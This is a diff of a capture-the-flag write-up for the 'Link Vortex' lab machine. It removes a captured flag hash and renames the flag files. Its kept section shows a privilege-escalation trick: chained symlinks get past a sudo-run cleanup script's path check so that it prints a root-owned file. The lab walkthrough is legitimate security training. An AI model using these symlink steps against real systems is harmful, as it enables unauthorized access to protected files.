@@ -1,7 +1,7 @@
 ---
 title: Link Vortex
 slug: Link-Vortex
-tags: [Linux, Ghost, Vulnerability Research]
+tags: [Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -225,9 +225,8 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Fri Mar 14 16:11:33 2025 from 10.10.16.98
 bob@linkvortex:~$ ls
-hey.txt  hi.txt  hyh.txt  user.txt
-bob@linkvortex:~$ cat user.txt
-87a9b456f12e1bb7d8e02fb802aac41f
+hey.txt  hi.txt  hyh.txt  local-proof.txt
+bob@linkvortex:~$ cat local-proof.txt
 bob@linkvortex:~$ 
 ```
 ## Privilege Escalation Path
@@ -283,13 +282,13 @@ fi
 ```
 
 - If the file name suffix is `.png` And the file is a symbol link. And the target path Not included `etc` or `root`.
-- Then create a symbol link to the `root.txt`. 
+- Then create a symbol link to the `privileged-proof.txt`. 
 - Since the script will check the parameters, a second link can be used to bypass, and at the same time `CHECK_CONTENT` Set to true.
 
 ### Root
 
 ```bash
-bob@linkvortex:~$ ln -s /root/root.txt hyh.txt  
+bob@linkvortex:~$ ln -s /root/privileged-proof.txt hyh.txt  
 bob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png  
 bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png  
 Link found [ /home/bob/hyh.png ] , moving it to quarantine  
